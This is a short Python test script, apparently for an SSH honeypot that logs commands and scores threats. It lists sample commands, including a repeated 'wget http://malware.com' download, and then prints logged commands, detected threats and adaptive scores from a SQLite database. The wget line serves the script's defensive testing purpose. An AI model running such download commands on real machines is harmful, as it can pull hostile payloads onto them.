import sqlite3
import time
from core.config import DATABASE_PATH

TEST_COMMANDS = [
    "ls",
    "pwd",
    "mkdir test",
    "cd test",
    "touch file1.txt",
    "ls",
    "wget http://malware.com",
    "wget http://malware.com",
    "wget http://malware.com",
    "wget http://malware.com",
    "wget http://malware.com",
]

def verify_database():

    conn = sqlite3.connect(DATABASE_PATH)
    cursor = conn.cursor()

    print("\n--- Commands Logged ---")
    cursor.execute("SELECT raw_input, response_type FROM commands ORDER BY command_id DESC LIMIT 10")
    for row in cursor.fetchall():
        print(row)

    print("\n--- Threats Detected ---")
    cursor.execute("SELECT threat_type, severity FROM threats ORDER BY threat_id DESC LIMIT 5")
    for row in cursor.fetchall():
        print(row)

    print("\n--- Adaptive Scores ---")
    cursor.execute("SELECT threat_type, occurrence_count, current_severity FROM adaptive_scores")
    for row in cursor.fetchall():
        print(row)

    conn.close()

if __name__ == "__main__":

    print("Run the SSH server first, then execute attack commands manually.")
    time.sleep(5)

    verify_database()